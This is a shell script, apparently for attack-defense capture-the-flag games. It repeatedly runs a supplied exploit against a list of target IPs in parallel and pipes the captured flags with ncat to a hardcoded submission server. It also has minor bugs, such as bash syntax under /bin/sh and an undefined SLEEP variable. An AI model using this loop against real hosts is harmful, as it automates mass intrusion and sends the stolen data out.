#!/bin/sh

# Change this
readonly FLAG_SERVICE_ADDR="172.22.11.181"
readonly FLAG_SERVICE_PORT=8000

# Probably change this
readonly GNUP_DELAY=0
readonly GNUP_TIMEOUT=18
readonly GNUP_MAXPROCS=16
readonly ITER_SLEEP=45

# Do not change this
declare COUNT=1
readonly PARALLEL=$(which parallel)
readonly targets="$1"
readonly exploiter="$2"
declare -a TARGETS
declare EXPLOITER

usage (){
	echo -e "parallel.sh targets exploiter"
	echo
	echo -e "targets: \tIPs, one per line"
	echo -e "exploiter: \tA script that's executable. Should take an IP,\n\t\tand print flag-service compatible string"
	echo
}

debug() { echo -e "\033[1;1m[\033[0mDEBUG\033[1;1m]\033[0m \033[1;1m[\033[0m$(date +%T)\033[1;1m]\033[0m $*"; }
warn() { echo -e "\033[1;1m[\033[0mWARNING\033[1;1m]\033[0m \033[1;1m[\033[0m$(date +%T)\033[1;1m]\033[0m $*"; }
info() { echo -e "\033[1;1m[\033[0m\033[1;32mINFO\033[0m\033[1;1m]\033[0m \033[1;1m[\033[0m\033[1;32m$(date +%T)\033[0m\033[1;1m]\033[0m $*"; }

check_dependencies (){
	if [ -z "$PARALLEL" ]; then
	    echo "This script needs GNU parallel"
	    exit 1
	fi
}

get_args (){
	if [[ -e $targets && -e $exploiter ]];then
		TARGETS=$(cat $targets)
		EXPLOITER="$exploiter"
	else
		usage
		exit 1
	fi
}

main (){
	check_dependencies
	get_args

	while :
	do
	    info "[RUN ${COUNT}]"

	    echo "$TARGETS" \
	    	| "$PARALLEL" \
		        --no-notice \
		        --delay "$GNUP_DELAY" \
		        --timeout "$GNUP_TIMEOUT" \
		        --max-procs="$GNUP_MAXPROCS" \
		        -u \
                "$EXPLOITER" \
                {} \
		        | ncat "$FLAG_SERVICE_ADDR" "$FLAG_SERVICE_PORT" 

	    info "[SLEEP ${SLEEP}]"
	    sleep "$ITER_SLEEP"
        COUNT=$(($COUNT+1))
	done
}

main
